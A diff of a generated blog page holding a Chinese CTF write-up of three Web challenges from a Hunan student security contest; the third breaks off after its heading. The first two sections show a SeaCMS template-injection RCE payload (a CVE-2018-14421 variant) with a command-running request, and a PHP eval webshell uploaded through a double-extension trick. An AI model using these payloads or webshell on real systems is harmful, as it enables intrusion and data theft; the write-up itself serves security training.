@@ -1,38 +1,24 @@
 <!DOCTYPE html>
 <html lang=zh>
-<head>
+<head><meta name="generator" content="Hexo 3.9.0">
     <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01 code audit题目描述:101.71.29.5:10039
-题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。
-12adminadmin123
-Backup有提示源码文件和flag文件在服务器上的位置
-审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce
-12zeroyu&amp;#123;if:1)$">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x01 code audit题目描述:101.71.29.5:10039 题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。 12adminadmin123 Backup有提示源码文件和flag文件在服务器上的位置 审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce 12zeroyu&amp;#123;if:1)$">
 <meta property="og:type" content="article">
 <meta property="og:title" content="湖南省第二届大学生网络安全技能竞赛初赛实践重赛-Web">
 <meta property="og:url" content="http://zer0yu.github.io/2018/11/23/2018-The-Second-HNCyber-Web-writeup/index.html">
 <meta property="og:site_name" content="Z3R0YU">
-<meta property="og:description" content="0x01 code audit题目描述:101.71.29.5:10039
-题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。
-12adminadmin123
-Backup有提示源码文件和flag文件在服务器上的位置
-审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce
-12zeroyu&amp;#123;if:1)$">
+<meta property="og:description" content="0x01 code audit题目描述:101.71.29.5:10039 题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。 12adminadmin123 Backup有提示源码文件和flag文件在服务器上的位置 审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce 12zeroyu&amp;#123;if:1)$">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png">
 <meta property="og:image" content="https://i.loli.net/2018/11/23/5bf7f2df1c527.png">
-<meta property="og:updated_time" content="2018-11-23T12:34:14.611Z">
+<meta property="og:updated_time" content="2018-11-23T12:34:14.612Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="湖南省第二届大学生网络安全技能竞赛初赛实践重赛-Web">
-<meta name="twitter:description" content="0x01 code audit题目描述:101.71.29.5:10039
-题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。
-12adminadmin123
-Backup有提示源码文件和flag文件在服务器上的位置
-审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce
-12zeroyu&amp;#123;if:1)$">
+<meta name="twitter:description" content="0x01 code audit题目描述:101.71.29.5:10039 题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。 12adminadmin123 Backup有提示源码文件和flag文件在服务器上的位置 审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce 12zeroyu&amp;#123;if:1)$">
 <meta name="twitter:image" content="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png">
     
     
@@ -63,7 +49,7 @@ Backup有提示源码文件和flag文件在服务器上的位置
     <!-- rss -->
     
     
-      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
     
 </head>
 
@@ -156,27 +142,27 @@ Backup有提示源码文件和flag文件在服务器上的位置
   <div class="content" itemprop="articleBody">
     <h2 id="0x01-code-audit"><a href="#0x01-code-audit" class="headerlink" title="0x01 code audit"></a>0x01 code audit</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h3><p>101.71.29.5:10039</p>
 <h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">admin</div><div class="line">admin123</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
 <p>Backup有提示源码文件和flag文件在服务器上的位置</p>
 <p>审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">zeroyu</div><div class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</div></pre></td></tr></table></figure>
-<p>注意一点这个id的值是要看响应包的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag</div></pre></td></tr></table></figure></p>
-<p>最后读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.这篇文章是从payload出发来分析触发点的，很具有借鉴意义–&gt;<br><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="external">CVE-2018-14421——Seacms后台getshell分析</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zeroyu</span><br><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+<p>注意一点这个id的值是要看响应包的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag</span><br></pre></td></tr></table></figure></p>
+<p>最后读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.这篇文章是从payload出发来分析触发点的，很具有借鉴意义–&gt;<br><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421——Seacms后台getshell分析</a></p>
 <p>文章中提到一点</p>
 <blockquote>
 <p>htm文件在开发中就只是模板文件，需要有控制器来渲染，渲染一般都是有include，render，render_template等等代码关键词，所以我们可以通过这个来确定控制器。</p>
 </blockquote>
-<p>2.<a href="https://www.anquanke.com/post/id/153402" target="_blank" rel="external">seacms v6.61 审计深入思考</a></p>
-<h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10031/index.php" target="_blank" rel="external">http://101.71.29.5:10031/index.php</a></p>
+<p>2.<a href="https://www.anquanke.com/post/id/153402" target="_blank" rel="noopener">seacms v6.61 审计深入思考</a></p>
+<h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10031/index.php" target="_blank" rel="noopener">http://101.71.29.5:10031/index.php</a></p>
 <h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析:"></a>题目分析:</h3><p>1.上传php文件–&gt;上传失败并提示It is not a image</p>
 <p>2.burp抓包并修改Content-Type: image/jpeg和文件后缀名–&gt;依旧上传失败</p>
 <p>3.猜测可能是判断了文件的格式，比如文件头什么的，所以我在图片里藏了一段PHP代码进行上传–&gt;成功上传，但是无法解析</p>
 <p>4.目标是Apache机器，进而构造<code>mu.jpg.php</code>后缀名进行上传–&gt;上传成功并且成功解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt;</div></pre></td></tr></table></figure>
-<p><a href="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" alt="屏幕快照 2018-11-23 下午1.52.01.png"></a></p>
-<p>5.使用cknife进行连接并找到flag<br><a href="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" alt="屏幕快照 2018-11-23 下午1.51.46.png"></a></p>
-<h2 id="0x03-高级渗透测试"><a href="#0x03-高级渗透测试" class="headerlink" title="0x03 高级渗透测试"></a>0x03 高级渗透测试</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10050/" target="_blank" rel="external">http://101.71.29.5:10050/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt;</span><br></pre></td></tr></table></figure>
+<p><a href="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" alt="屏幕快照 2018-11-23 下午1.52.01.png"></a></p>
+<p>5.使用cknife进行连接并找到flag<br><a href="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" alt="屏幕快照 2018-11-23 下午1.51.46.png"></a></p>
+<h2 id="0x03-高级渗透测试"><a href="#0x03-高级渗透测试" class="headerlink" title="0x03 高级渗透测试"></a>0x03 高级渗透测试</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述:"></a>题目描述:</h3><p><a href="http://101.71.29.5:10050/" target="_blank" rel="noopener">http://101.71.29.5:10050/</a></p>
 <h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析:"></a>题目分析:</h3>
   </div>
 </article>
